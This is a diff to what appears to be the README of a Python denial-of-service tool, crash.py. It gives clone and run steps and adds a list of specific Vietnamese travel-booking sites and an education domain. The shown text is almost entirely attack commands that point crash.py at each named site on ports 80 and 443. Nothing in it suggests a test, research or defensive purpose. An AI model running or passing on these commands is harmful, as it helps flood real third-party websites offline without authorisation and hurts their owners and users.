@@ -3,11 +3,27 @@
 git clone https://github.com/lehongphuong/python-ddos.git
 cd python-ddos
 chmod +x crash.py
+
 python3 crash.py www.site.com port 80
 
 python3 crash.py www.site.com 80
 Default port 80 - site www not http
 ```
+
+https://www.phongvetaulyson.com/
+https://phongvesaky.com/
+http://olytravel.vn/
+https://www.phuotdaolyson.com/
+www.vetaulyson.com
+
+python3 crash.py www.vetaulyson.com
+
+python3 crash.py www.phongvetaulyson.com 80
+python3 crash.py www.phongvetaulyson.com 443
+python3 crash.py phongvesaky.com 443
+python3 crash.py olytravel.vn 80
+python3 crash.py www.phuotdaolyson.com 80
+
 python3 crash.py phongvesaky.com 80
 python3 crash.py phongvecangsaky.com 80
 python3 crash.py hce.edu.vn 80 
